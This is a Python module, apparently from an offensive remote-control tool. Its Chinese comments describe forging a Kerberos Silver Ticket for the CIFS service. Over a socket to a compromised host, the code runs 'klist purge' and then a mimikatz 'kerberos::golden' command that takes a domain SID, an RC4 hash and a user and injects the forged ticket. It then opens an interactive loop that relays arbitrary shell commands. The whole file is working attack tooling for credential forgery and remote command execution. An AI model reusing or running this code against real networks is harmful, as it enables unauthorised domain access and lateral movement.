import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory


# 使用 Silver Ticket 伪造 CIFS 服务权限
# 在非域控主机执行
def Silver_Ticket(conn, choice):
    print('\033[1;34;34m' + "[*] Clearing tickets:" + '\033[0m')
    command0 = "klist purge"
    receive(conn, command0)
    print('\033[1;34;34m' + "[*] Preparing silver ticket:" + '\033[0m')
    command = "mimikatz.exe \"privilege::debug\" \"kerberos::golden /domain:" + choice.split()[1] + " /sid:" + choice.split()[3] + " /target:dc." + choice.split()[1] + " /service:cifs /rc4:" + choice.split()[2] + " /user:" + choice.split()[4] + " /ptt\" exit"
    receive(conn, command)
    commands = ["back"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32mSilver Ticket > \033[0m')
    history = InMemoryHistory()
    while True:
        command = prompt(formatted_text1, completer=completer, history=history)
        if command == 'back':
            break
        elif command == "":
            continue
        receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
